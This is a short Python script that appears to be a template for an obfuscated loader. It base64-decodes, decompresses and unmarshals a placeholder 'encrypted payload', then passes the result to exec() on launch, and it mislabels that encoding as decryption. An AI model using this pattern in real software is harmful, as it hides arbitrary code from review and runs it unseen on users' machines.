import os
import sys
import base64
import zlib
import marshal
import codecs

# Encrypted payload
ENCRYPTED_CODE = """
eJw1W... [very long base64 string] ...
"""

def decrypt_code(encrypted_data):
    """Decrypt and execute the encrypted code"""
    try:
        # Decode base64
        decoded_data = base64.b64decode(encrypted_data)
        # Decompress
        decompressed_data = zlib.decompress(decoded_data)
        # Unmarshal and execute
        code_obj = marshal.loads(decompressed_data)
        exec(code_obj)
    except Exception as e:
        print(f"Decryption error: {e}")

if __name__ == "__main__":
    decrypt_code(ENCRYPTED_CODE)